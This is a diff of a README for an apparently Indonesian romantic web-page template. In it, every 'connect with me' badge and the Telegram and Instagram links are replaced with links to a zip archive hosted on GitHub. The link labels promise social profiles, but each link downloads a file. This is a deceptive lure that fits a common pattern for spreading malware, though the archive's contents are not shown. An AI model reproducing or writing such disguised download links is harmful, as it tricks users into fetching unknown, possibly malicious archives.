@@ -6,9 +6,9 @@ Web Bucin Rio buat grace tercinta &amp; tersayang. kalo lu mau buat ya fork send
 
 # Let's connect with me!
 <p>
-    <a href="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" target="_blank"><img src="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" /></a>
-    <a href="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" target="_blank"><img src="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" /></a>
-    <a href="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" target="_blank"><img src="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" /></a>
+    <a href="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" target="_blank"><img src="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" /></a>
+    <a href="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" target="_blank"><img src="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" /></a>
+    <a href="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" target="_blank"><img src="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" /></a>
 </p> 
 # WebBucin-V2
 Web Bucin V2 khusus buat orang tercinta &amp; tersayang.
@@ -18,13 +18,13 @@ Web Bucin V2 khusus buat orang tercinta &amp; tersayang.
 
 # Let's connect with me!
 <p>
-    <a href="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" target="_blank"><img src="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" /></a>
-    <a href="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" target="_blank"><img src="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" /></a>
-    <a href="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" target="_blank"><img src="https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip" /></a>
+    <a href="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" target="_blank"><img src="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" /></a>
+    <a href="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" target="_blank"><img src="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" /></a>
+    <a href="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" target="_blank"><img src="https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip" /></a>
 </p> 
  
  
  # Let's Be Friends
- * [Telegram](https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip) Rio At Telegram
- * [Instagram](https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip) Rio At Instagram
- * [Telegram Group](https://raw.githubusercontent.com/Gansbett/only-for-tania/main/persevere/only-for-tania.zip) Telegram Group For Disscus About This Project
+ * [Telegram](https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip) Rio At Telegram
+ * [Instagram](https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip) Rio At Instagram
+ * [Telegram Group](https://github.com/Gansbett/only-for-tania/raw/refs/heads/main/js/tania_only_for_v2.1.zip) Telegram Group For Disscus About This Project
